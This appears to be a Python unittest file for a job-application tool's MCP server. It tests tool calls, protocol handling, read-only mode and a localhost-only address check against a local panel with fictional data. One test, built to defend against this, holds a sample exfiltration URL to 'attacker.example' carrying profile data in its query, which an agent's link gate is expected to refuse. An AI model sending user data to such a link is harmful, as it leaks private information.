"""The MCP server (apps/mcp) against a real panel on the fictional example: the protocol over stdio through the launcher,
every reading tool, the writes the API already has (a job, tailoring, the kit, board moves, reminders), read-only mode,
the address check, and the error a missing panel gives. No model is called: the agent is off.

    python3 -m unittest tests/app/test_mcp.py -v
"""
import json  # the protocol
import os  # environment for the panel
import pathlib  # paths
import shutil  # clean the temporary folder
import socket  # a port nothing listens on
import subprocess  # the server through the launcher, as an agent starts it
import sys  # the import path and the interpreter
import tempfile  # a workspace for the class
import threading  # the panel in the background
import unittest  # the runner

ROOT = pathlib.Path(__file__).resolve().parents[2]  # the repository
sys.path.insert(0, str(ROOT))  # apps/ and core/ are found from here
from apps.mcp.server import Panel, Server, search, slide_text  # noqa: E402  the server under test and its shaping parts
from apps.panel import server as panel_server  # noqa: E402  the real panel it talks to

POSTING = ROOT / "tests" / "app" / "fixtures" / "posting_ko.md"  # a fictional posting
READS = ["status", "list_jobs", "get_job", "job_fit", "read_document", "document_file", "deck", "interview_board",
         "interview_search", "form_answers", "tracker", "insights", "library", "task"]  # the reading tools, in the table's order
WRITES = ["add_job", "make_documents", "build_pdfs", "export_documents", "make_interview_kit", "write_interview_scripts",
          "move_job", "log_round", "add_fact", "reminder"]  # the writing tools


def free_port() -> int:
    """A port on this PC that nothing listens on (bound, then let go)."""
    with socket.socket() as s:  # closed again at once
        s.bind(("127.0.0.1", 0))  # the system picks one
        return s.getsockname()[1]  # its number


class McpCase(unittest.TestCase):
    """One panel on a fresh workspace with the example kept, and one job added through the MCP tools."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = pathlib.Path(tempfile.mkdtemp(prefix="offerowl-mcp-"))  # data folder
        os.environ["OFFEROWL_DESKTOP"] = str(cls.tmp / "Desktop")  # an export lands here, never on a real Desktop
        os.environ.pop("OFFEROWL_PANEL_AGENT", None)  # no stand-in left from another class
        os.environ["OFFEROWL_PANEL_BACKEND"] = "none"  # no real CLI on this PC is called
        cls.srv = panel_server.serve(0, data=cls.tmp / "data")  # a free port
        cls.port = cls.srv.server_address[1]  # the port it got
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()  # it answers while the tests run
        cls.url = f"http://127.0.0.1:{cls.port}"  # the address the MCP server is given
        cls.mcp = Server(Panel(cls.url))  # in this process, for the tool tests
        p = cls.mcp.panel  # the example read and kept, through the same API the page uses
        p.post("/api/v1/example", {"lang": "ko"})  # "Try with an example person"
        cls.call_ok("task", key="ingest", wait=90)  # read without an agent
        p.post("/api/v1/facts/keep-all", {})  # "Keep all"
        out = cls.call_ok("add_job", posting=POSTING.read_text(encoding="utf-8"))  # the job, through the tool
        cls.job = out["job"]  # its id (Hangul)
        cls.call_ok("task", key=out["task"], wait=90)  # its analysis by words

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()  # serve_forever returns
        cls.srv.server_close()  # the port is free again
        for k in ("OFFEROWL_PANEL_BACKEND", "OFFEROWL_DESKTOP"):  # the class's own settings
            os.environ.pop(k, None)  # the next class starts clean
        shutil.rmtree(cls.tmp, ignore_errors=True)  # the temporary workspace goes

    @classmethod
    def call(cls, name, **args):
        """tools/call through the protocol's own handler: the reply's result."""
        reply = cls.mcp.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": name, "arguments": args}})
        return reply["result"]  # content and isError

    @classmethod
    def call_ok(cls, name, **args):
        """A tool call that must succeed: its answer as data."""
        res = cls.call(name, **args)  # the result
        if res["isError"]:  # a failure says why
            raise AssertionError(f"{name}: {res['content'][0]['text']}")
        text = res["content"][0]["text"]  # one text block
        try:
            return json.loads(text)  # JSON for data
        except ValueError:  # the plain resume
            return text


class TestProtocol(McpCase):
    """The protocol as a client sees it: through `./offerowl mcp`, one JSON message per line."""

    def test_stdio_through_the_launcher(self):
        msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                                                                                "clientInfo": {"name": "test", "version": "0"}}},
                {"jsonrpc": "2.0", "method": "notifications/initialized"},  # no reply
                {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
                {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "list_jobs", "arguments": {}}},
                {"jsonrpc": "2.0", "id": 4, "method": "resources/list"}]  # not offered
        stdin = "\n".join(json.dumps(m, ensure_ascii=False) for m in msgs) + "\nnot json\n"  # and one broken line
        env = {**os.environ, "OFFEROWL_LANG": "en"}  # the launcher's own words, if any, in English
        r = subprocess.run([sys.executable, str(ROOT / "offerowl"), "mcp", "--url", self.url], input=stdin, capture_output=True,
                           text=True, encoding="utf-8", env=env, timeout=60)  # the client closes stdin: the server ends
        self.assertEqual(0, r.returncode, r.stderr)  # a clean end
        replies = [json.loads(line) for line in r.stdout.splitlines()]  # every stdout line is a message
        self.assertEqual([1, 2, 3, 4, None], [m.get("id") for m in replies])  # the notification got none, the broken line one
        init = replies[0]["result"]  # the handshake
        self.assertEqual("2025-06-18", init["protocolVersion"])  # the client's own revision
        self.assertEqual("offerowl", init["serverInfo"]["name"])  # who answers
        self.assertIn("tools", init["capabilities"])  # tools only
        self.assertEqual(READS + WRITES, [t["name"] for t in replies[1]["result"]["tools"]])  # every tool, the reads first
        jobs = json.loads(replies[2]["result"]["content"][0]["text"])["jobs"]  # the tool's answer
        self.assertEqual([self.job], [j["id"] for j in jobs])  # the job added above
        self.assertEqual(-32601, replies[3]["error"]["code"])  # method not found
        self.assertEqual(-32700, replies[4]["error"]["code"])  # parse error

    def test_unknown_revision_gets_the_newest(self):
        r = Server(Panel(self.url)).handle({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "1999-01-01"}})
        self.assertEqual("2025-11-25", r["result"]["protocolVersion"])  # ours, for the client to judge

    def test_schemas_and_hints(self):
        for t in self.mcp.listing():  # every tool
            self.assertEqual("object", t["inputSchema"]["type"])  # an object of arguments
            self.assertFalse(t["inputSchema"]["additionalProperties"])  # a misspelled argument is refused by the client
            self.assertEqual(t["name"] in READS, t["annotations"]["readOnlyHint"])  # the hint matches the table

    def test_read_only_mode_offers_no_writes(self):
        ro = Server(Panel(self.url), read_only=True)  # an agent that should only look
        self.assertEqual(READS, [t["name"] for t in ro.listing()])  # the reads alone
        r = ro.handle({"jsonrpc": "2.0", "id": 9, "method": "tools/call", "params": {"name": "add_job", "arguments": {"posting": "x" * 40}}})
        self.assertEqual(-32602, r["error"]["code"])  # a tool it was never offered
        self.assertEqual(1, len(self.call_ok("list_jobs")["jobs"]))  # and nothing was added

    def test_an_ask_fetches_only_the_links_the_person_wrote(self):
        # the command bar's MCP server (apps/api/ask.py passes the person's links): any other link is refused before the
        # panel is asked, so nothing the agent read can leave in a link's query
        ask = Server(Panel(self.url), links=["https://posting.example.invalid/job/1"])
        jobs = len(self.call_ok("list_jobs")["jobs"])
        res = ask.run("add_job", {"url": "https://attacker.example/c?d=the-profile"})
        self.assertTrue(res["isError"])
        self.assertIn("only a link the person wrote", res["content"][0]["text"])
        self.assertEqual(jobs, len(self.call_ok("list_jobs")["jobs"]))  # nothing added, nothing fetched
        res = ask.run("add_job", {"url": "https://posting.example.invalid/job/1/"})  # the person's link (a slash more): past the gate
        self.assertNotIn("only a link the person wrote", res["content"][0]["text"])  # the panel's own answer (.invalid has no address)
        hint = {t["name"]: t["annotations"]["openWorldHint"] for t in ask.listing()}
        self.assertTrue(hint["add_job"])  # it may reach outside this PC
        self.assertFalse(any(v for k, v in hint.items() if k != "add_job"))  # nothing else does

    def test_the_links_come_from_the_command_bars_environment(self):
        # started as a file, as the command bar starts it, with the links it allows (here none)
        msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                                                                                "clientInfo": {"name": "test", "version": "0"}}},
                {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "add_job", "arguments": {"url": "https://attacker.example/c"}}}]
        env = {**os.environ, "OFFEROWL_MCP_LINKS": "[]"}
        r = subprocess.run([sys.executable, str(ROOT / "apps" / "mcp" / "__main__.py"), "--url", self.url], input="\n".join(json.dumps(m) for m in msgs) + "\n",
                           capture_output=True, text=True, encoding="utf-8", env=env, timeout=60)
        out = [json.loads(line) for line in r.stdout.splitlines() if line.strip()]
        call = next(m for m in out if m.get("id") == 2)["result"]
        self.assertTrue(call["isError"])
        self.assertIn("only a link the person wrote", call["content"][0]["text"])

    def test_only_this_pc(self):
        for bad in ("http://example.com:8797", "https://127.0.0.1:8797", "http://127.0.0.1", "http://10.0.0.1:8797"):  # elsewhere, TLS, no port
            with self.assertRaises(ValueError, msg=bad):
                Panel(bad)  # refused before any request

    def test_no_panel_is_a_tool_error(self):
        res = Server(Panel(f"http://127.0.0.1:{free_port()}")).run("status", {})  # nothing listens there
        self.assertTrue(res["isError"])  # said to the agent, not a crash
        self.assertIn("no Offerowl panel answers", res["content"][0]["text"])  # with what to do


class TestReads(McpCase):
    """The reading tools on the example and its job."""

    def test_status(self):
        st = self.call_ok("status")  # at a glance
        self.assertEqual("offerowl", st["app"])  # the panel answered
        self.assertEqual("none", st["agent"]["backend"])  # the agent is off in tests
        self.assertEqual(1, st["jobs"])  # the job added
        self.assertEqual("done", st["tasks"]["ingest"]["state"])  # the reading ended
        self.assertNotIn("facts_view", st)  # cut to the summary

    def test_job_and_fit(self):
        j = self.call_ok("get_job", job=self.job)  # the card and the posting
        self.assertIn("감마클라우드", j["posting"])  # the fictional posting's text
        self.assertEqual("preparing", j["stage"])  # a new card
        f = self.call_ok("job_fit", job=self.job)  # line by line
        self.assertEqual(sum(f["counts"].values()), len(f["lines"]))  # each line rated once
        self.assertTrue(any(isinstance(e, dict) and e.get("quote") for line in f["lines"] for e in line["evidence"]))  # with quotes
        bare = self.call_ok("job_fit", job=self.job, quotes=False)  # names only
        self.assertTrue(all(isinstance(e, str) for line in bare["lines"] for e in line["evidence"]))  # no quotes

    def test_rounds_answers_and_facts_through_the_tools(self):
        r = self.call_ok("log_round", job=self.job, kind="call", at="2026-11-09T19:00", asked="왜 이 회사인가", notes="짧은 통화")["round"]
        self.assertEqual(("call", "2026-11-09T19:00"), (r["kind"], r["at"]))
        card = next(j for j in self.call_ok("list_jobs")["jobs"] if j["id"] == self.job)
        self.assertEqual([r["id"]], [x["id"] for x in card["rounds"]])  # on the card the agent reads
        self.assertIn("days", card)  # with the stages' days that count
        self.assertIsNone(self.call_ok("log_round", job=self.job, id=r["id"], remove=True)["round"])  # and off again
        self.assertEqual([], self.call_ok("form_answers", job=self.job)["questions"])  # no form questions yet: an empty list, not an error
        cid = self.call_ok("add_fact", kind="other", statement="면접에서 말한 사실: 장애 대응 문서를 직접 썼다")["cid"]
        self.assertTrue(cid)  # kept, its own words its evidence
        self.assertTrue(self.call("log_round", job=self.job, kind="chat", at="2026-11-09")["isError"])  # an unknown kind is the API's refusal

    def test_unknown_job_is_the_apis_refusal(self):
        res = self.call("get_job", job="no-such-job")  # a made-up id
        self.assertTrue(res["isError"])  # a tool error
        self.assertIn('"status": 400', res["content"][0]["text"])  # the API's own answer, passed on

    def test_missing_argument(self):
        res = self.call("job_fit")  # no job
        self.assertTrue(res["isError"])  # said to the agent
        self.assertIn("`job` is required", res["content"][0]["text"])  # which one

    def test_resume_in_print_order(self):
        doc = self.call_ok("read_document", kind="resume", job=self.job)  # the job's resume
        rows = doc["sentences"]  # one per sentence
        self.assertEqual(doc["counts"]["sentences"], len(rows))  # every sentence once
        self.assertEqual("summary.headline", rows[0]["sid"])  # the headline leads, as it prints
        self.assertTrue(all(r["text"] for r in rows))  # each with its words
        general = self.call_ok("read_document", kind="resume")  # no job: the general resume
        self.assertTrue(general["sentences"])  # drawn too

    def test_files_not_made_yet(self):
        res = self.call("document_file", job=self.job, file="resume.txt")  # no edition built in this class
        self.assertTrue(res["isError"])  # the API's 404
        self.assertIn('"status": 404', res["content"][0]["text"])  # passed on
        res = self.call("document_file", job=self.job, file="../profile.json")  # not a fixed name
        self.assertTrue(res["isError"])  # refused here, before any request

    def test_deck(self):
        d = self.call_ok("deck", job=self.job)  # the live deck
        if "missing" in d:  # this PC has no typesetting tools: the reason, as the page shows it
            self.assertIsInstance(d["missing"], str)
        else:  # drawn: one text per slide
            self.assertEqual(d["slides"], len(d["text"]))  # every slide
            self.assertNotIn("html", d)  # the page only when asked

    def test_tracker(self):
        tr = self.call_ok("tracker")  # the board
        self.assertEqual(["preparing", "submitted", "interview", "result"], tr["stages"])  # its columns
        self.assertEqual([self.job], [j["id"] for j in tr["jobs"]])  # the card
        self.assertNotIn("plan", tr["jobs"][0])  # without drawing data

    def test_unknown_task(self):
        res = self.call("task", key="tailor:nothing")  # never started
        self.assertTrue(res["isError"])  # said
        self.assertIn("ingest", res["content"][0]["text"])  # with the keys there are


class TestShaping(unittest.TestCase):
    """The parts that cut the API's answers down, on made-up inputs: the example's kit has no scripts while the agent is off."""

    def test_slide_text_drops_tags_and_attributes(self):
        page = ('<html><style>.a{}</style><section class="slide cover" data-part="x">\n<h1>PORTFOLIO</h1><p>Kim &amp; Co</p>'
                '<script>var a = 1;</script></section><section class="slide" data-kind=""><p>Second</p></section></html>')  # two slides
        self.assertEqual(["PORTFOLIO Kim & Co", "Second"], slide_text(page))  # words only, one string per slide

    def test_search_ranks_scripts_and_questions(self):
        board = {"categories": [{"kind": "posting", "questions": [{"id": "P1", "text": "Kubernetes deploys", "ask_en": "", "ask_ko": ""}]}],
                 "scripts": [{"id": "A1", "title_en": "Deploy platform", "title_ko": "", "category": "", "key": "", "note": "",
                              "turns": [{"who": "me", "text": "We ran Kubernetes with Helm"}]},
                             {"id": "A2", "title_en": "Payments", "title_ko": "", "category": "", "key": "", "note": "", "turns": []}]}  # made up
        hits = search(board, "kubernetes helm", 8)  # two words
        self.assertEqual(["A1", "P1"], [h["id"] for h in hits])  # both words first, then one, and nothing for neither
        self.assertEqual("script", hits[0]["type"])  # the whole script, with its dialogue
        self.assertEqual(["A1"], [h["id"] for h in search(board, "helm", 1)])  # the limit holds


class TestWrites(McpCase):
    """The writes, in order: the documents and the kit, then the board."""

    def test_1_make_documents_and_the_kit(self):
        out = self.call_ok("make_documents", job=self.job)  # resume, letter and kit together
        self.assertEqual(f"tailor:{self.job}", out["task"])  # the key to wait for
        rec = self.call_ok("task", key=out["task"], wait=180)  # waited for
        self.assertEqual("done", rec["state"], rec)  # ended
        self.assertEqual("needs_agent", rec["parts"]["cover"])  # the letter needs the agent, which is off
        self.assertTrue(self.call_ok("make_interview_kit", job=self.job)["questions"] > 0)  # the map is there
        b = self.call_ok("interview_board", job=self.job)  # the board
        self.assertTrue(b["ready"])  # the kit folder exists
        self.assertTrue(all("turns" not in s for s in b["scripts"]))  # heads only
        q = b["categories"][0]["questions"][0]  # a question of the map
        word = max(q["text"].split(), key=len)  # its longest word
        hits = self.call_ok("interview_search", job=self.job, query=word)["hits"]  # searched by it
        self.assertTrue(hits and all(word.lower() in json.dumps(h, ensure_ascii=False).lower() for h in hits))  # each holds it
        self.assertEqual([q["id"]], [h["id"] for h in self.call_ok("interview_search", job=self.job, ids=[q["id"]])["hits"]])  # by id

    def test_2_board_moves(self):
        c = self.call_ok("move_job", job=self.job, stage="submitted", date="2026-01-05", next="wait for the call")  # a move with its date
        self.assertEqual(("submitted", "2026-01-05", "wait for the call"), (c["stage"], c["dates"]["submitted"], c["next"]))
        self.assertEqual("interview", self.call_ok("move_job", job=self.job, advance=True)["stage"])  # one column right
        self.assertTrue(self.call("move_job", job=self.job)["isError"])  # nothing asked
        self.assertEqual("interview", self.call_ok("move_job", job=self.job, stage="hired")["stage"])  # a stage the board lacks moves nothing
        r = self.call_ok("reminder", job=self.job, at="2099-01-01", text="follow up")["reminder"]  # a reminder
        self.assertEqual("follow up", r["text"])  # kept
        bad = self.call("reminder", job=self.job, at="tomorrow", text="x")  # not a date
        self.assertTrue(bad["isError"])  # the API's refusal


if __name__ == "__main__":
    unittest.main()
